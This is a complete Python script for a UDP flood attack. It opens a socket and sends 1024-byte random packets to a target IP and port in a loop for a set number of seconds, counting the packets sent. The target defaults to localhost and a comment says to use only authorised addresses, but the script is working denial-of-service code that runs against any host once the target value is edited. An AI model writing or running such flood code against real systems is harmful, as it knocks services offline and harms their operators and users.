import socket
import random
import time

def udp_flood(target_ip, target_port, duration):
    """
    Executes a UDP flood attack for a specified duration.

    Args:
        target_ip (str): The IP address of the target.
        target_port (int): The port on the target to send packets to.
        duration (int): The duration of the attack in seconds.
    """
    # Create a UDP socket
    # AF_INET specifies IPv4
    # SOCK_DGRAM specifies UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate a packet of random bytes.
    # A larger size (e.g., 1024 or 65500) creates more network traffic.
    packet_data = random.randbytes(1024)
    
    # Get the start time of the attack
    timeout = time.time() + duration
    sent_packets = 0

    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")

    try:
        # Loop until the specified duration is over
        while time.time() < timeout:
            # Send the UDP packet to the target IP and port
            client.sendto(packet_data, (target_ip, target_port))
            sent_packets += 1
        
        print(f"Attack finished. Sent {sent_packets} packets.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the socket
        client.close()

if __name__ == '__main__':
    # --- Configuration ---
    # WARNING: Only use an IP address and port that you are authorized to test.
    # For local testing, you can use "127.0.0.1" (localhost).
    target_ip = "127.0.0.1" 
    target_port = 8080        # An arbitrary port
    attack_duration = 10      # Duration of the attack in seconds

    udp_flood(target_ip, target_port, attack_duration)



